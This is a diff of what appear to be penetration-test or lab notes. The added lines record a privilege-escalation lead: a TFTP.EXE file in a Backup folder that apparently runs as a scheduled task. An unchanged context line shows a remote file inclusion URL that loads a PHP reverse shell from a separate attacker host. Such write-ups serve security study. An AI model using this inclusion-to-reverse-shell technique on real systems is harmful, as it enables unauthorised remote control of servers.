@@ -204,4 +204,8 @@ http://192.168.81.53:8080/site/index.php?page=http://192.168.49.81:4443/php-reve
 
 ### PrivEsc vector
 
+There is a file called TFTP.EXE in \Backup
+
+* It appears to be a scheduled task that runs every 5 minutes
+
 ## Proofs
